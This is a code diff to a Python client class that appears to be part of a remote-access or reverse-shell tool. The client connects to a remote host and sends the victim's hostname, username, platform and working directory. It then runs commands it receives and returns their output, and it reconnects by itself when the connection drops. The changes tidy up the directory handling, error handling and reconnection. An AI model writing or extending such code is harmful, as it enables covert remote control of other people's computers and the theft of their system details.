@@ -34,13 +34,12 @@ class Client:
         self.platform_type: str = sys.platform.lower()
         self.username = getpass.getuser()
         self.working_directory = os.getcwd()
-        self.system_drive: str
+        self.user_path: str = os.environ['USERPROFILE']
 
-        self.new_working_directory: str = os.path.join()
+        self.new_working_directory: str = os.path.join(self.user_path)
+        os.chdir(self.new_working_directory)
 
-        os.chdir('C:\\')
-
-        self.socket.send(self.working_directory.encode())
+        self.socket.send(self.new_working_directory.encode())
         self.socket.send(socket.gethostname().encode())
         self.socket.send(self.username.encode())
         self.socket.send('Windows'.encode() if self.platform_type == 'win32' else self.platform_type.encode())
@@ -59,19 +58,17 @@ class Client:
                 command_arguments: list = command_data[1:]
                 command_name: str = command_data[0]
 
-                print(command_arguments)
-
                 if command_name.lower() in self.get_commands:
                     output = self.execute_command(command_name, command_arguments)
                     self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
                 else:
                     output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
                     self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
-            except IndexError:
+            except (IndexError, ConnectionResetError):
                 self.restart()
 
     def restart(self):
-        os.system('cls') if self.platform_type == 'win32' else os.system('clear')
+        os.system('cls')
         self.__class__(self.host, self.port)
 
     def execute_command(self, module_name: str, args: list = None) -> str:
@@ -89,11 +86,7 @@ class Client:
                 stdout = stdout.getvalue()
                 return stdout
             except Exception as exception:
-                match type(exception).__name__:
-                    case 'ModuleNotFoundError':
-                        return f'{module_name} does not exist'
-                    case _:
-                        return f'{exception}'
+                return f'{exception}'
 
     @property
     def get_commands(self):
